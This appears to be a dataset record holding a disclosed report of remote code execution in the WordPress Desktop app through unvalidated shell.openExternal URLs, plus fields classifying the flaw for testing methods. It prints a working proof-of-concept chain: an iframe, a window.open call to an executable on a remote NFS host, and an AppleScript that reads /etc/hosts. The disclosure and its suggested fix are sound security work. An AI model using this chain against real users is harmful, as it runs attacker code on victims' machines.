  "content": "\nAn attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution.\nThis issue looks to be around this line of code:\nhttps://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38\nIf shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser). If we pass the an a .app file on MacOS or an exe it will just execute the code.\nWe also link to a remote readable NFS mount (or windows share) to point to a remote executable.\nA Wordpress page is created with:\nCode 131 Bytes\n1<center><iframe style=\"border: 0;\" src=\"https://maustin.net/hax/wp_desktop/index.html\" width=\"250\" height=\"250\"></iframe></center>\u00a0\nThis file has the following code:\nCode 159 Bytes\n1   <script>\n2      // window.open('file:///Applications/Calculator.app');\n3      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')\n4   </script>\nThe file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:\nCode 147 Bytes\n1tell application \"Terminal\"\n2    do script \"cat /etc/hosts\"\n3    display dialog \"You just got hacked!\"\n4end tell\n5\n6do shell script \"open -a Calculator\"\nPOC\nCreate the setup described above.\nInvite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the \"reader\")\nCode is executed when the user views the page.\nSee attached video for a working POC.\nSugested Fix:\nBefore passing a url to shell.openExternal the application should validate that it begins with http:// or https://.\nImpact\nAn attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run.\nThe remote attacker would be able to run any code as the current user on the system once the page is viewed.\nIn my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.\n\n",

  "vuln_description": "The vulnerability allows remote code execution in WordPress Desktop by exploiting the `shell.openExternal` function, which does not validate URLs before processing them. An attacker can craft a malicious page that, when viewed or edited in the desktop app, executes arbitrary code on the victim's machine.",

    "reasoning": "The vulnerability involves injecting a malicious file:// URL into a WordPress page's content (via iframe) that triggers RCE through shell.openExternal in a desktop app. While the injection vector (page content parameter) could theoretically be discovered via HTTP request/response analysis during regular navigation, the payload execution occurs in a native desktop environment rather than the web application's same-channel context. The RCE impact is not detectable through HTTP responses or web application behavior analysis since it executes locally on the client machine outside the web channel.",

    "reason": "The vulnerability involves remote code execution via a malicious page in WordPress Desktop, which is not directly related to authentication or authorization bypass within the same application. The methodology described focuses on testing authentication and authorization boundaries within a single application by swapping user sessions and resource IDs. Since this vulnerability exploits a feature in the WordPress Desktop application to execute arbitrary code, it does not fit the described methodologies for detecting IDOR or AuthN/AuthZ bypass vulnerabilities.",
